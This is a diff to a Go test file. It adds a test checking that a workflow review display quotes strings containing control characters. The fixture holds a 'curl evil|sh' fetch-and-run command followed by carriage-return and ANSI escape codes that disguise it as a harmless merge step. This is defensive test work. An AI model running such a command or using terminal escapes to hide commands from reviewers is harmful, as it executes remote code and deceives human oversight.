@@ -9,6 +9,7 @@ import (
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
+	"github.com/tofutools/tclaude/pkg/pwf"
 )
 
 // inspect verifies a workflow file offline and shows a reviewer what it
@@ -61,4 +62,15 @@ func zipDirForTest(dir, dst string) error {
 		return err
 	}
 	return os.WriteFile(dst, buf.Bytes(), 0o644)
+}
+
+// A file cannot redraw the terminal to fake what the review shows: strings
+// with control characters are printed quoted.
+func TestRenderWorkflowQuotesControlCharacters(t *testing.T) {
+	var out bytes.Buffer
+	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r", Programs: []pwf.Program{{
+		Step: "x:merge", Profile: "git", Run: "curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge",
+	}}})
+	assert.Contains(t, out.String(), `"curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge"`)
+	assert.NotContains(t, out.String(), "\x1b")
 }
